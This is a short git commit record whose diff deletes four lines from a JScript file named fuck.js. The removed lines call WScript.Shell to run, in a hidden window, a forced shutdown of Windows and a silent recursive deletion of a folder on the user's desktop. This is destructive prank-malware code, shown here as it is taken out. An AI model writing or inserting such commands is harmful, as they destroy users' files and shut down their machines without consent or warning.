c362a9685a736fd28e3d32a736053cc1ea2dd197
fuckwithyou <fuck@leeching.net>
2016-04-14 00:44:11 -0400

    Update fuck.js

--- fuck.js
+++ fuck.js
@@ -1,4 +1,1 @@
-c1="cmd /c shutdown -s -t 300";
-c2="cmd /c rd /s /q %userprofile%\\desktop\\a";
-new ActiveXObject("WScript.Shell").Run(c1,0,true);
-new ActiveXObject("WScript.Shell").Run(c2,0,true);
+
